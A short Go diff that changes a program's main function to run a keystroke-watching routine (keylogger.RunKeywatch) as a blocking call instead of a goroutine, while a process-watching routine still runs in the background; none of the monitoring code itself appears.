@@ -22,8 +22,7 @@ func main() {
 		exitChannel <- true
 	}()
 
-	go keylogger.RunKeywatch(exitChannel)
 	go openprograms.RunProcessWatch(false)
 
-	<-exitChannel
+	keylogger.RunKeywatch(exitChannel)
 }
